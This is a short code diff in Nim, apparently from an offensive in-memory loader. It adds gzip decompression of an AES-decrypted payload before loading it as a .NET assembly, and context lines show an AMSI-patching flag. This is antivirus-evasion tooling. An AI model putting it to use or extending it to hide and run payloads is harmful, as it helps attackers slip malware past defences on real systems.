@@ -24,6 +24,7 @@ import winim/clr except `[]`
 import winim/lean
 import nimcrypto
 import nimcrypto/sysrand
+import zippy
 
 let
     usePatchAmsi = false
@@ -110,7 +111,9 @@ dctx.init(key, iv)
 dctx.decrypt(encrypted, decrypted)
 dctx.clear()
 
-var assembly = load(decrypted)
+var dectextstring: string = cast[string](decrypted)
+var decompressed: string = uncompress(dectextstring,dfGzip)
+var assembly = load(toByteSeq(decompressed))
 
 var cmd: seq[string]
 var i = 1
